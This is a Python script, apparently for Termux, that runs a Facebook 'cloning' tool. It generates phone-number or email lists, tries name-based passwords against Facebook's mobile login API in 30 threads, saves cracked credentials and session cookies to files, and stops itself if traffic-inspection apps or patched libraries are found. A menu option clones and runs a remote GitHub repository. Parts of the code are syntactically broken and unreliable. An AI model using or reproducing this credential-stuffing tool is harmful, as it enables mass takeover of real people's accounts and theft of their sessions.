 ####@-----Import-----@####

import os,base64

os.system('git pull -q;rm .rndm')

try:

	import os,sys,time,json,random,re,string,platform,base64,uuid,requests,io,struct	from string import *

	from concurrent.futures import ThreadPoolExecutor as ThreadPool

except(ImportError):

    os.system("pip install requests")

    pass

try:

    import bs4

except(ImportError):

    os.system("pip install bs4")

    pass

try:

	a = "anar"

	t="tt"

	fileee = os.listdir('/sdcard/Android/data/')

	if f'com.h{t}pc{a}y.pro' in fileee:

		print('Delete Http Canary');sys.exit()

except:pass

lm = '/data/data/com.termux/files/usr/lib/python3.11'

if not 'print' in open(lm+'/site-packages/requests/sessions.py','r').read():

	pass

else:sys.exit()

import subprocess

from bs4 import BeautifulSoup

import json,os,time,base64,random,re,sys, subprocess 

from requests.exceptions import ConnectionError as CError

from concurrent.futures import ThreadPoolExecutor as speed

accounts = []

loop = 0

####DESIGN####

def oo(t):

	return '\033[1;91m[\033[1;97m'+str(t)+'\033[1;91m]\033[1;97m '

###USERAGENTSGEN####

fbks=('FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')

android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')

andd=subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')

model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')

carr=subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')

build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')

device = {

        'android_version':android_version,

        'model':model,

        'build':build,

         'cr':carr,

         'brand':andd}

ua = []

import requests

rs = requests.get

ua = []

del ua

"""

Mozilla/5.0 (<system-information>) <platform> (<platform-details>) <extensions>

"""

ua=[]<product> / <product-version> <comment>

##Logo##

P = '\x1b[1;97m'

G='\x1b[1;92m'

R='\x1b[1;91m'

S ='\x1b[1;96m'

Y ='\x1b[1;93m'

uu ='\x1b[1;95m'

tred = speed

	

logo= f'''

  __  __          _   _  ____  

 |  \/  |   /\   | \ | |/ __ \ 

 | \  / |  /  \  |  \| | |  | |

 | |\/| | / /\ \ | . ` | |  | |

 | |  | |/ ____ \| |\  | |__| |

 |_|  |_/_/    \_\_| \_|\____/ 

\033[1;93m=================================

\033[1;97m Owner  : NAZIA x KHAN :/

\033[1;97m GitHub : MANO-404 :/

\033[1;97m Version:\033[1;92m 0.1 \033[1;97m:/

\033[1;97m Status : Free :/

\033[1;97m Notice : Use 10007/10006 For More OK Ids :/

\033[1;93m=================================

'''

####@-----Menu-----@####

def Hxw_Main():

    os.system("clear")

    print(logo)

    print(f"{oo(1)}File Cloning")

    print(f"{oo(2)}Pak Random Cloning")

    print(f"{oo(3)}Gmail Cloning")  

    print(f"{oo(4)}Create File")

    print(f"{oo(0)}Exit")

    inpp = input(f"{oo('?')}Your Choice : ")

    if inpp == "1":

        file()

    if inpp == '2':pak()

    if inpp =='3':

        gmail()

    if inpp == "4":

     print(f'{oo("+")}Loading Best File Create Command ')

     os.system('cd && git clone --depth=1 https://github.com/Hannan-404/FILE')

     os.system('cd && cd FILE ;python FILE.py')

     exit()

    if inpp == "0":

     exit('Exit!')

     

     

l = []

####@-----File-----@####

def file():

    os.system("clear")

    print(logo)

    if 'gm' in l:

        file = '.Hannan'

    else:

        file = input(f"{oo('-')}Enter File: ")

    try:

        for x in open(file,'r').readlines():

            accounts.append(x.strip())

    except:

        print(f"{oo('!')}File Not Found");time.sleep(1)

        Hxw_Main()

     

    method()

    exit()

    

            

   

####@-----AppCheck-----@####

def check(session,coki):

    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text

    sop = BeautifulSoup(w,"html.parser")

    x = sop.find("form",method="post")

    game = [i.text for i in x.find_all("h3")]

    if len(game)==0:

    	pass

    else:

        for gm in game:

            print(f"\033[1;97m---\033[1;96m"+gm.replace('huwtn',' hxw-code=hannan-33'))

    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text

    sop = BeautifulSoup(w,"html.parser")

    x = sop.find("form",method="post")

    game = [i.text for i in x.find_all("h3")]

    if len(game)==0:

        pass

    else:

        for gm in game:

            print(f"\033[1;97m---\033[1;93m"+gm.replace('riJan','Hxw-182^)Code=hannan-2233]'))

####@-----Gmail-----@####

def gmail():     

        os.system('rm -rf .Hannan')

        first = input(f'{oo("?")}Put First Name: ')

        last = input(f'{oo("?")}Put Last Name: ')

        domain = input(f'{oo("?")}Put Domain: ')

        try:

            limit = input(f'{oo("?")}Put Limit: ')

        except ValueError:

            limit = 5000

        lists = ['3','4']

        for xd in range(int(limit)):

            lchoice = random.choice(lists)

            if '3' in lchoice:

                mail = ''.join(random.choice(string.digits) for _ in range(3))

                open('.Hannan','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')

            else:

                mail = ''.join(random.choice(string.digits) for _ in range(4))

                open('.Hannan','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')

            fo = open('.Hannan', 'r').read().splitlines()

        with tred(max_workers=30) as king___xd:

            tl = str(len(fo))

            tk = first+last

            l.append('gm')

            file()

       

        

####@-----PakNumber-----@####

def pak():

	user=[]

	code = input(f'{oo("!")}Put Code : ')

	try:

		limit = int(input(f'{oo("?")}Put Limit :  '))

	except ValueError:

		limit = 5000

	for nmbr in range(limit):

		nmp = ''.join(random.choice(string.digits) for _ in range(7))

		user.append(nmp)

	for psx in user:

		ids = code+psx

		open('.rndm','a').write(ids+'|'+psx+' '+ids+'\n')

	andom()

####@-----UserAgent----@####

"""

["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 RuxitSynthetic/1.0 v5359060285 t9161186898619143541 athfa3c3975 altpub cvcv=2 smf=0"

"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 RuxitSynthetic/1.0 v3552152466444236601 t333490267752157646 athe94ac249 altpriv cvcv=2 smf=0"

"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v2015726281679301178 t7552511725732370273 ath2653ab72 altpriv cvcv=2 smf=0"

"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 RuxitSynthetic/1.0 v16644953463 t2764462768300104709 athfa3c3975 altpub cvcv=2 smf=0"

"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 RuxitSynthetic/1.0 v3829455965823487578 t4462750191762339745 ath5ee645e0 altpriv cvcv=2 smf=0"

"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v1983566663514674369 t1938226207387349051 ath93eb305d altpriv cvcv=2 smf=0"

"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v7334953243242162207 t1268671518308813255 ath259cea6f altpriv cvcv=2 smf=0"

"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 RuxitSynthetic/1.0 v650988331624041891 t7646402857184646781 ath5ee645e0 altpriv cvcv=2 smf=0"

"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 RuxitSynthetic/1.0 v6896370920720556321 t8580874436398610803 ath5ee645e0 altpriv cvcv=2 smf=0"

"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 RuxitSynthetic/1.0 v5359084096 t9161186898619143541 athfa3c3975 altpub cvcv=2 smf=0"

"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 RuxitSynthetic/1.0 v16645008003 t2764462768300104709 athfa3c3975 altpub cvcv=2 smf=0"

"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 RuxitSynthetic/1.0 v3558394178464204568 t1268671518308813255 ath259cea6f altpriv cvcv=2 smf=0"

"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 RuxitSynthetic/1.0 v8002005321579310968 t7222547378829582219 ath5ee645e0 altpriv cvcv=2 smf=0"

"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v3021910092614777075 t2750863319282183303 athe94ac249 altpriv cvcv=2 smf=0"

"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 RuxitSynthetic/1.0 v1664253550722119929 t4513637865375916569 ath1fb31b7a altpriv cvcv=2 smf=0"

"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 RuxitSynthetic/1.0 v16645044432 t2764462768300104709 athfa3c3975 altpub cvcv=2 smf=0"

"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 RuxitSynthetic/1.0 v5359107917 t9161186898619143541 athfa3c3975 altpub cvcv=2 smf=0"

"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 RuxitSynthetic/1.0 v8250318355666270085 t4462750191762339745 ath5ee645e0 altpriv cvcv=2 smf=0"

"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 RuxitSynthetic/1.0 v2069359846653383184 t3290455477412880993 ath1fb31b7a altpriv cvcv=2 smf=0"

"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 RuxitSynthetic/1.0 v8365266927972869933 t1268671518308813255 ath259cea6f altpriv cvcv=2 smf=0"

"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 RuxitSynthetic/1.0 v8935100070066215207 t8580874436398610803 ath5ee645e0 altpriv cvcv=2 smf=0"

"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v5697009957304031345 t333490267752157646 athe94ac249 altpriv cvcv=2 smf=0"

"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 RuxitSynthetic/1.0 v8464403153353831679 t7552511725732370273 ath2653ab72 altpriv cvcv=2 smf=0"

"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v6891156386655903165 t2769863229975289018 ath4b3726d5 altpriv cvcv=2 smf=0"

"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 RuxitSynthetic/1.0 v16645098952 t2764462768300104709 athfa3c3975 altpub cvcv=2 smf=0"

"Mozilla/5.

####@-----FileM-----@####

def method():

    okacc = []

    cpacc = []

    totalpass = []

    os.system("clear")

    print(logo)

    if 'o':      

        lp = input(f'{oo("?")}Total Password? : ')

        if lp.isnumeric():

            ex = 'firstlast first123 last123'

            print(f'{oo("+")}{ex} (ETC)')

            for x in range(int(lp)):

                totalpass.append(input(f'{oo(x+1)}Password : '))

            pass

        else:

            print(f"{oo('!')}Numeric Only")

            exit()

    print(f'\n'+oo("1")+'Method 1 (Updated)\n'+oo("2")+'Method 2 (Updated)')

    m=input(f"{oo('!')}Input : ") 

    print('\n'+oo("?")+'Do You Want To Show Cp Ids?(y/n)')

    cpok=input(f"{oo('!')}Input : ")

    print('\n'+oo("?")+'Do You Want To Show Cookies?(y/n)')

    c=input(f"{oo('!')}Input : ")

    apps='y'

    os.system("clear")

    print(logo) 

    print('\033[1;93m='*25)

    print(f'{oo("✓")}Total Ids : \033[1;92m'+str(len(accounts)))

    print(f"{oo('-')}Wait As You Can :)")

    print(f"{oo('•')}/sdcard/MANO-OK.txt")

    print('\033[1;93m='*25)

    print()

    

    def start(user):

     try:

        global loop,accounts

        r = requests.Session()

        user = user.strip()

        acc, name = user.split("|")

        first = name.rsplit(" ")[0]

        try:

            last = name.rsplit(" ")[1]

        except:

           last = first

        pers = str(int(loop)/int(len(accounts)) * 100)[:4]

        sys.stdout.write('\r\033[1;91m[\033[1;97mHXW-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))

        sys.stdout.flush()

        for pword in totalpass:              

            heads = None

            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}

            pword = pword.replace("first", first).replace("last", last)

            pword = pword.lower()

            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}

            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)

      #      print(response.text)

            if 'session_key' in response.text:

                okacc.append(acc)

                print('\r\033[1;92m[\033[1;97mMANO-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')

                open('/sdcard/MANO-OK.txt','a').write(f'{acc} • {pword}\n')

                if c=='y':

                    try:

                           q = json.loads(response.text)

                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])

                           ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")

                           cookies = f"sb={ssbb};{ckkk}"

                    except Exception as e:print(str(e)+' | '+response.text)

                break

            elif 'www.facebook.com' in response.text:

                if cpok=='n':

                     pass

                else:

                     print('\r\033[1;91m[\033[1;97mNazia-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')

                cpacc.append(acc)

                open('/sdcard/Nazia-CP.txt','a').write(f'{acc} • {pword}\n')

                break

            else:

                continue

        loop += 1

     except Exception as e:time.sleep(10)

   

 

    def start2(user):

      global loop,accounts

      try:

        r = requests.Session()

        user = user.strip()

        acc, name = user.split("|")

        first = name.rsplit(" ")[0]

        try:

            last = name.rsplit(" ")[1]

        except:

            last = first

        pers = str(int(loop)/int(len(accounts)) * 100)[:4]

        sys.stdout.write('\r\033[1;91m[\033[1;97mHXW-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))

        sys.stdout.flush()

        for pword in totalpass:

            heads = None

            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}

            pword = pword.replace("first", first).replace("last", last)

            pword = pword.lower()

            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}

            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)

            if 'session_key' in response.text:

                okacc.append(acc)

                print('\r\033[1;92m[\033[1;97mMANO-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')

                open('/sdcard/MANO-OK.txt','a').write(f'{acc} • {pword}\n')

                if 'y' in apps:

                	check(r,coki)

                if c=='y':

                 try:  

                  q = json.loads(response.text)

                  ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])

                  ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")

                  cookies = f"sb={ssbb};{ckkk}"

                 except Exception as e:print(str(e)+' | '+response.text)

                 print('\r\033[1;93m[\033[1;97mCookie\033[1;93m] \033[1;97m'+cookies)                

                 break

            elif 'checkpoint' in response.text:

                if cpok=='n':

                     pass

                else:

                     print('\r\033[1;91m[\033[1;97mNazia-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)

                cpacc.append(acc)

                open('/sdcard/Nazia-CP.txt','a').write(f'{acc} • {pword}\n')

                break

            else:

                continue

        loop += 1    

      except Exception as e: time.sleep(10)

    if m=='2':

        with speed(max_workers=30) as speede:

             speede.map(start2, accounts)

    elif m=='1':

       with speed(max_workers=30) as speede:

            speede.map(start, accounts)

    else:

       with speed(max_workers=30) as speede:

            speede.map(start, accounts)

    exit()  

      

####@-----Random-----@####

def andom():

    okacc = []

    cpacc = []

    totalpass = []

    os.system("clear")

    print(logo)

    if 'o': 

        tpp = input(f'{oo("?")}Total Password? : ')

        totalpass.append('first')

        totalpass.append('last')

        if tpp.isnumeric():

            ex = 'firstlast first123 last123'

            print(f'{oo("+")}{ex} (ETC)')

            for x in range(int(tpp)):

                totalpass.append(input(f'{oo(x+1)}Password : '))

            pass

        else:

            print(f"{oo('!')}Numeric Only")

            exit()

    print(f'\n'+oo("1")+'Method 1 (Updated)\n'+oo("2")+'Method 2 (Updated)')

    m=input(f"{oo('!')}Input : ") 

    print('\n'+oo("?")+'Do You Want To Show Cp Ids?(y/n)')

    cpok=input(f"{oo('!')}Input : ")

    print('\n'+oo("?")+'Do You Want To Show Cookies?(y/n)')

    c=input(f"{oo('!')}Input : ")

    os.system("clear")

    print(logo) 

    print('\033[1;93m='*25)

    print(f'{oo("✓")}Total Ids : \033[1;92m'+str(len(accounts)))

    print(f"{oo('-')}Wait As You Can :)")

    print(f"{oo('•')}/sdcard/MANO-OK.txt")

    print('\033[1;93m='*25)

    print()    

    def start(user):

     try:

        global loop,accounts

        r = requests.Session()

        user = user.strip()

        acc, name = user.split("|")

        first = name.rsplit(" ")[0]

        try:

            last = name.rsplit(" ")[1]

        except:

            last = first

        pers = str(int(loop)/int(len(accounts)) * 100)[:4]

        sys.stdout.write('\r\033[1;91m[\033[1;97mHXW-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))

        sys.stdout.flush()

        for pword in totalpass:              

            heads = None

            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}

            pword = pword.replace("first", first).replace("last", last)

            pword = pword.lower()

            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}

            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)

      #      print(response.text)

            if 'session_key' in response.text:

                okacc.append(acc)

                print('\r\033[1;92m[\033[1;97mMANO-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')

                open('/sdcard/MANO-OK.txt','a').write(f'{acc} • {pword}\n')

                if c=='y':

                    try:

                           q = json.loads(response.text)

                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])

                           ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")

                           cookies = f"sb={ssbb};{ckkk}"

                    except Exception as e:print(str(e)+' | '+response.text)

                break

            elif 'www.facebook.com' in response.text:

                if cpok=='n':

                     pass

                else:

                     print('\r\033[1;91m[\033[1;97Nazia-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')

                cpacc.append(acc)

                open('/sdcard/Mano-CP.txt','a').write(f'{acc} • {pword}\n')

                break

            else:

                continue

        loop += 1

     except Exception as e:time.sleep(10)

   

 

    def start2(user):

      global loop,accounts

      try:

        r = requests.Session()

        user = user.strip()

        acc, name = user.split("|")

        first = name.rsplit(" ")[0]

        try:

            last = name.rsplit(" ")[1]

        except:

            last = first

        pers = str(int(loop)/int(len(accounts)) * 100)[:4]

        sys.stdout.write('\r\033[1;91m[\033[1;97mHXW-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))

        sys.stdout.flush()

        for pword in totalpass:

            heads = None

            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}

            pword = pword.replace("first", first).replace("last", last)

            pword = pword.lower()

            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}

            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)

            if 'session_key' in response.text:

                okacc.append(acc)

                print('\r\033[1;92m[\033[1;97mMANO-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')

                open('/sdcard/MANO-OK.txt','a').write(f'{acc} • {pword}\n')

                if 'y' in apps:

                	check(r,coki)

                if c=='y':

                 try:  

                  q = json.loads(response.text)

                  ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])

                  ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")

                  cookies = f"sb={ssbb};{ckkk}"

                 except Exception as e:print(str(e)+' | '+response.text)

                 print('\r\033[1;93m[\033[1;97mCookie\033[1;93m] \033[1;97m'+cookies)                

                 break

            elif 'checkpoint' in response.text:

                if cpok=='n':

                     pass

                else:

                     print('\r\033[1;91m[\033[1;97mNazia-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)

                cpacc.append(acc)

                open('/sdcard/Nazia-CP.txt','a').write(f'{acc} • {pword}\n')

                break

            else:

                continue

        loop += 1    

      except Exception as e: time.sleep(10)

      

    for x in open('.rndm','r').read().splitlines():

    	accounts.append(x)

    

    if m=='2':

        with speed(max_workers=30) as speeed:

             speede.map(start2, accounts)

    elif m=='1':

       with speed(max_workers=30) as speede:

            speede.map(start, accounts)

    else:

       with speed(max_workers=30) as speede:

            speede.map(start, accounts)

    exit()

Hxw_Main()
